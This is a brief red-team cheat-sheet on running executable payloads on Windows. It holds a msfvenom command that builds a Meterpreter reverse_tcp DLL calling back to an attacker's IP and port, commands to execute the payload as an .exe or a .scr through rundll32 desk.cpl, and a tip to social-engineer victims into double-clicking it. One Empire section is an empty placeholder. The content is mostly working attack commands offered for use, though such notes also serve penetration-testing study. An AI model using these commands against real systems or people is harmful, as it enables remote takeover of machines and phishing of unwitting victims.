# EXE Execution

## 01 - Generate Payloads

### 1.1 - `msfvenom`

Generate a DLL payload then execute it with `StartW` entry point.

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f dll -o payload.dll
```

### 1.2 - Empire

TODO: Fill this info

UseStager

CSharp payload

MSFVenom

## 02 - Execute Payloads

### 2.1 - EXE

> [!TIP] EXE Payloads
> You can actually social engineer the victim to double click the `.exe` to establish connection.

```
C:\> .\payload.exe
```

### 2.2 - SCR

#### 2.2.1 - `desk`

```
C:\> rundll32.exe desk.cpl,InstallScreenSaver C:\path\to\payload.scr
```

---
## References

### LOLBAS

- [LOLBAS: Desk](https://lolbas-project.github.io/lolbas/Libraries/Desk/)

### DMCXBlue

- [DMCXBlue: Attachments - SCR Files](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/initial-access/t1566-phishing/phishing-spearphishing-attachment/attachments-scr-files)